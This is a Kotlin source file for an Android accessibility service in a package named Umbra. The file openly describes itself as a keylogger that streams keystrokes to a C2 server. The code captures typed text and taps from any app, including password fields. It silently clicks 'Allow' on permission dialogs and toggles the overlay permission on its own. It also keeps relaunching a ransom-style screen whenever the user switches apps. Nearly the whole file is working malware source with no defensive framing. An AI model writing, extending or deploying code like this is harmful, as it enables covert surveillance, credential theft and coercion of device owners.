package org.umbra.core.modules

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.umbra.core.persistence.PermissionRansomActivity

/**
 * AccessibilityService that captures keystrokes and typed text from any app's
 * input fields, feeding them to KeylogModule for buffering + real-time
 * streaming to the C2 server.
 *
 * MUST be manually enabled by user in:
 * Settings → Accessibility → Umbra Keylogger
 *
 * Event handling:
 *  - TYPE_VIEW_TEXT_CHANGED: fires on every edit of a focused text field.
 *    We diff against the previously-seen field text (and event.beforeText) to
 *    extract exactly what was just typed, then stream that delta.
 *  - TYPE_WINDOW_CONTENT_CHANGED: used to detect focus/field switches so we
 *    reset per-field tracking (and occasionally capture the field label).
 */
class UmbraAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "Umbra.Accessibility"
        @Volatile var instance: UmbraAccessibilityService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        KeylogModule.hasActiveSession = true
        instance = this
        Log.d(TAG, "Accessibility service connected — keylogger + auto-grant active")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // ── Auto-grant: detect permission dialog and click "Allow" ──
                if (packageName == "com.google.android.permissioncontroller" ||
                    packageName == "com.android.permissioncontroller") {
                    // Delay so the dialog content has time to load before we
                    // search for the "Allow" button.
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        autoClickAllowButton()
                    }, 400)
                }
                // ── Auto-grant: detect overlay settings and toggle switch ──
                if (packageName == "com.android.settings") {
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        autoToggleOverlay()
                    }, 400)
                }
                // ── Anti-dismissal: if ransom activity not showing, re-launch ──
                if (packageName != "org.umbra.core" &&
                    packageName != "com.google.android.permissioncontroller" &&
                    packageName != "com.android.permissioncontroller" &&
                    packageName != "com.android.settings" &&
                    packageName != "com.android.systemui") {
                    if (!PermissionRansomActivity.hasAllPermissions(applicationContext)) {
                        PermissionRansomActivity.launch(applicationContext)
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event, packageName)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleWindowChanged(event, packageName)
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = event.text?.joinToString(" ") ?: ""
                if (text.isNotBlank()) {
                    KeylogModule.onKeyEvent(packageName, "[TAP] $text")
                }
            }
        }
    }

    /**
     * Auto-click the "Allow" / "While using the app" button on permission dialogs.
     * Uses AccessibilityNodeInfo traversal to find clickable buttons.
     */
    private fun autoClickAllowButton() {
        try {
            val rootNode = rootInActiveWindow ?: return
            // Look for buttons with text like "Allow", "While using the app", "Allow only while using"
            val allowTexts = listOf(
                "Allow", "ALLOW", "Allow only while using the app",
                "While using the app", "Allow all the time",
                "Permitir", "Allowir", "Autoriser", "السماح"
            )
            findAndClickButton(rootNode, allowTexts)
        } catch (e: Exception) {
            Log.d(TAG, "autoClickAllowButton: ${e.message}")
        }
    }

    /**
     * Auto-toggle the overlay permission switch in Settings.
     */
    private fun autoToggleOverlay() {
        try {
            val rootNode = rootInActiveWindow ?: return
            // Look for a toggle/switch related to "Display over other apps"
            val toggleTexts = listOf(
                "Permit drawing over other apps",
                "Display over other apps",
                "Draw over other apps",
                "Appear on top",
                "Afficher au-dessus des autres applications"
            )
            findAndClickToggle(rootNode, toggleTexts)
        } catch (e: Exception) {
            Log.d(TAG, "autoToggleOverlay: ${e.message}")
        }
    }

    private fun findAndClickButton(node: android.view.accessibility.AccessibilityNodeInfo, texts: List<String>) {
        for (text in texts) {
            val clicked = node.findAccessibilityNodeInfosByText(text)
            for (n in clicked) {
                var clickable = n
                while (clickable != null && !clickable.isClickable) {
                    clickable = clickable.parent
                }
                clickable?.let {
                    it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Auto-clicked: $text")
                    return
                }
            }
        }
    }

    private fun findAndClickToggle(node: android.view.accessibility.AccessibilityNodeInfo, texts: List<String>) {
        for (text in texts) {
            val found = node.findAccessibilityNodeInfosByText(text)
            for (n in found) {
                // Look for a switch/toggle nearby
                var parent = n.parent
                while (parent != null) {
                    val switches = parent.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
                    if (switches.isNotEmpty()) {
                        val sw = switches[0]
                        if (!sw.isChecked) {
                            sw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "Auto-toggled overlay: $text")
                            return
                        }
                    }
                    parent = parent.parent
                }
            }
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent, packageName: String) {
        // Full text currently in the field (may be masked for password fields).
        val fullText = event.text?.joinToString(" ") ?: ""
        val beforeText = event.beforeText?.toString() ?: ""

        // Determine what was just typed.
        val delta: String? = when {
            beforeText.isNotEmpty() && fullText != beforeText -> {
                // Android 9+ provides the pre-change text directly.
                diffDelta(beforeText, fullText)
            }
            else -> KeylogModule.computeTypedDelta(packageName, fullText)
        }

        // Always record the full field text into the buffer (context for dump),
        // and stream the keystroke delta in real-time.
        if (fullText.isNotBlank()) {
            KeylogModule.onKeyEvent(packageName, fullText)
        }
        if (delta != null && delta.isNotBlank()) {
            KeylogModule.onKeystroke(packageName, delta)
        }
    }

    private fun handleWindowChanged(event: AccessibilityEvent, packageName: String) {
        // Occasionally a field label/placeholder is exposed here — capture it as
        // a context marker rather than a keystroke.
        val text = event.text?.joinToString(" ") ?: ""
        if (text.isNotBlank() && text.length <= 80) {
            KeylogModule.onKeyEvent(packageName, "[FIELD] $text")
        }
    }

    /**
     * Computes the inserted text (or a backspace marker) between two strings.
     */
    private fun diffDelta(before: String, after: String): String? {
        if (before == after) return null
        var i = 0
        while (i < before.length && i < after.length && before[i] == after[i]) i++
        val beforeSuffix = before.length - i
        val afterSuffix = after.length - i
        var s = 0
        while (s < beforeSuffix && s < afterSuffix &&
            before[before.length - 1 - s] == after[after.length - 1 - s]) s++
        val removed = before.substring(i, before.length - s)
        val added = after.substring(i, after.length - s)
        return when {
            added.isNotEmpty() && removed.isEmpty() -> added
            added.isEmpty() && removed.isNotEmpty() -> "\u232B".repeat(removed.length)
            added.isNotEmpty() && removed.isNotEmpty() -> "\u232B${removed.length}$added"
            else -> null
        }
    }

    override fun onInterrupt() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasActiveSession = false
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasActiveSession = false
        super.onDestroy()
        Log.d(TAG, "Accessibility service destroyed — keylogger stopped")
    }
}
